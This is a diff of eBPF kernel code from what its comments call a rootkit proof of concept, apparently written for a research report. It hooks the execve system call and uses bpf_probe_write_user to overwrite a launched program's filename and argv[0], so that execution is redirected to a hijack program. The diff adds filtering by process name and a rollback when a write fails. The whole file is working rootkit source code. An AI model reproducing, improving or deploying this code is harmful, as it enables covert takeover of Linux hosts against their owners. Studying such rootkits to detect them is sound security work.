@@ -86,10 +86,23 @@ static __always_inline int test_write_user_unique(struct sys_execve_enter_ctx *c
 
 static __always_inline int handle_tp_sys_enter_execve(struct sys_execve_enter_ctx *ctx, __u64 pid_tgid){
     //Check if the exec hijacker is active already
+    char comm[TASK_COMM_LEN] = {0};
+    int err = bpf_get_current_comm(comm, sizeof(comm));
+    
+
     if(hijacker_state == 1 || EXEC_HIJACK_ACTIVE_TEMP == 0){
         return 0;
     }
+
+    if(TASK_COMM_RESTRICT_HIJACK_ACTIVE == 1){
+        char *task = TASK_COMM_NAME_RESTRICT_HIJACK;
+        if(str_n_compare(comm, TASK_COMM_LEN, task, 5, 5) != 0){
+            //bpf_printk("failed: %s", comm);
+            return 0;
+        }
+    }
     bpf_printk("Starting execve hijacker\n");
+    bpf_printk("EXEC_COMM: %s\n", comm);
     
     char* argv[NUMBER_ARGUMENTS_PARSED] = {0};
     //unsigned char* envp[PROGRAM_LENGTH] = {0};
@@ -144,6 +157,9 @@ static __always_inline int handle_tp_sys_enter_execve(struct sys_execve_enter_ct
     user-side of the rootkit, and fork a process with the requested execve() call. I considered this not to be good enough.
 
     Note: The arguments of this tracepoint are marked as const, so upon futher review we might have an undefined behaviour issue.
+    Note: Upon further investigation, I found the answer why executing commands from the bash terminal usually means
+        the modification is failed:https://lists.linuxfoundation.org/pipermail/iovisor-dev/2017-September/001035.html
+    Note: Restriction: because of the file locking mechanism in the userspace program, piped programs do not work for this PoC
     */
 
     char to_write[sizeof(PATH_EXECUTION_HIJACK_PROGRAM)] = {0};
@@ -165,10 +181,10 @@ static __always_inline int handle_tp_sys_enter_execve(struct sys_execve_enter_ct
     }
 
     if(bpf_probe_write_user((void*)(ctx->filename), (void*)to_write, (__u32)sizeof(PATH_EXECUTION_HIJACK_PROGRAM))<0){
-        bpf_printk("Error writing to user memory by %s\n", filename);
-        //bpf_printk("NEW ARGV0: %s\n", argv[0]);
-        //bpf_printk("ARGV1: %s\n", argv[1]);
-        //bpf_printk("ARGV2: %s\n", argv[2]);
+        bpf_printk("Error writing to user memory at filename by %s\n", filename);
+        bpf_printk("NEW ARGV0: %s\n", argv[0]);
+        bpf_printk("ARGV1: %s\n", argv[1]);
+        bpf_printk("ARGV2: %s\n", argv[2]);
         return -1;
     }
     
@@ -184,8 +200,12 @@ static __always_inline int handle_tp_sys_enter_execve(struct sys_execve_enter_ct
     }
     //Bpf pointer writing, not possible to be done directly to ctx->argv[0]
     //TODO: Mention this in the report
-    if(bpf_probe_write_user((void*)argv[0], (void*)filename, filename_len)<0){
-        bpf_printk("Error writing to user memory by %s\n", filename);
+    if(bpf_probe_write_user((void*)argv[0], (void*)filename, filename_len+1)<0){
+        bpf_printk("Error writing to user memory at argv[0] by %s\n", filename);
+        //If this happens then the filename was modified, but we have failed to modify this so
+        //we must return the original filename
+        bpf_probe_write_user((void*)(ctx->filename), (void*)filename, filename_len+1);
+        bpf_printk("Reversed the previous filename write\n");
         return -1;
     }
 
